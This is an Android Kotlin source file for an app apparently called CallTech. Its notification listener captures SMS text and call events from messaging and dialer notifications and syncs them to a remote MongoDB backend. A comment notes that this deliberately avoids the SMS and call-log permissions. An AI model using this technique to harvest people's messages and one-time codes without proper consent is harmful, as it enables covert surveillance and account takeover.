package com.calltech

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import java.util.Locale
import java.util.regex.Pattern

/**
 * SMS / missed-call notifications se data capture — READ_SMS / READ_CALL_LOG ki zarurat nahi.
 * Install ke baad Android system me ek baar "Notification access" ON karna pad sakta hai
 * (Settings > Apps > Special access) — ye SMS permission dialog nahi hai.
 */
class CallTechNotificationListener : NotificationListenerService() {

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "Notification listener connected — background capture ON")
        SyncBootstrap.start(applicationContext, "notification_listener")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null || sbn.isOngoing) {
            return
        }

        val packageName = sbn.packageName ?: return
        if (!SMS_PACKAGES.any { packageName.contains(it, ignoreCase = true) } &&
            !CALL_PACKAGES.any { packageName.contains(it, ignoreCase = true) }
        ) {
            return
        }

        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString()?.trim().orEmpty()
        val text = extras.getCharSequence("android.text")?.toString()?.trim().orEmpty()
        val bigText = extras.getCharSequence("android.bigText")?.toString()?.trim().orEmpty()
        val body = bigText.ifBlank { text }.ifBlank { title }
        val timestamp = sbn.postTime.takeIf { it > 0L } ?: System.currentTimeMillis()

        if (body.isBlank()) {
            return
        }

        val app = applicationContext

        if (CALL_PACKAGES.any { packageName.contains(it, ignoreCase = true) }) {
            handleCallNotification(app, title, body, timestamp, packageName)
            return
        }

        handleSmsNotification(app, title, body, timestamp)
    }

    private fun handleSmsNotification(
        context: android.content.Context,
        title: String,
        body: String,
        timestamp: Long,
    ) {
        val phone = extractPhone(title, body)
        LocalDataStore.saveMessage(
            context = context,
            phoneNumber = phone,
            body = body,
            timestamp = timestamp,
            source = "notification_sms",
        )

        BackgroundSyncRunner.run {
            LocalDataStore.syncAllToMongo(context, "notification_sms")
            MessageSyncHelper.syncIncomingSms(
                context = context,
                phoneNumber = phone,
                body = body,
                timestamp = timestamp,
                source = "notification_sms",
                subscriptionId = null,
            )
            MessageEventEmitter.notifyNewSms(phone, body, timestamp)
        }
    }

    private fun handleCallNotification(
        context: android.content.Context,
        title: String,
        body: String,
        timestamp: Long,
        packageName: String,
    ) {
        val combined = "$title $body"
        val lower = combined.lowercase(Locale.US)
        val type = when {
            lower.contains("missed") -> "MISSED"
            lower.contains("incoming") || lower.contains("received") -> "INCOMING"
            lower.contains("outgoing") || lower.contains("dialed") -> "OUTGOING"
            else -> "INCOMING"
        }

        val phone = extractPhone(title, body)
        val name = if (title.contains(phone)) phone else title.ifBlank { phone }

        LocalDataStore.saveCall(
            context = context,
            phoneNumber = phone,
            name = name,
            type = type,
            durationSeconds = 0,
            timestamp = timestamp,
            source = "notification_call",
        )

        BackgroundSyncRunner.run {
            LocalDataStore.syncAllToMongo(context, "notification_call")
            CallSyncHelper.syncCapturedCall(
                context = context,
                phoneNumber = phone,
                name = name,
                type = type,
                durationSeconds = 0,
                timestamp = timestamp,
                source = "notification_call",
            )
            if (CallSyncHelper.hasCallLogPermission(context)) {
                CallSyncHelper.syncLatestCalls(context, "notification_call")
            }
            MessageEventEmitter.notifyNewCall()
        }

        Log.d(TAG, "Call notification captured from $packageName: $phone")
    }

    private fun extractPhone(title: String, body: String): String {
        val combined = "$title $body"
        val matcher = PHONE_PATTERN.matcher(combined)

        if (matcher.find()) {
            return matcher.group()?.trim() ?: "Unknown"
        }

        if (title.matches(Regex(".*\\d{5,}.*"))) {
            return title.trim()
        }

        return title.ifBlank { "Unknown" }
    }

    companion object {
        private const val TAG = "CallTechNotifListener"

        private val SMS_PACKAGES = listOf(
            "mms",
            "messaging",
            "sms",
            "message",
        )

        private val CALL_PACKAGES = listOf(
            "dialer",
            "incallui",
            "telecom",
            "call",
            "phone",
        )

        private val PHONE_PATTERN = Pattern.compile(
            "(\\+?\\d[\\d\\s-]{7,}\\d)",
        )
    }
}
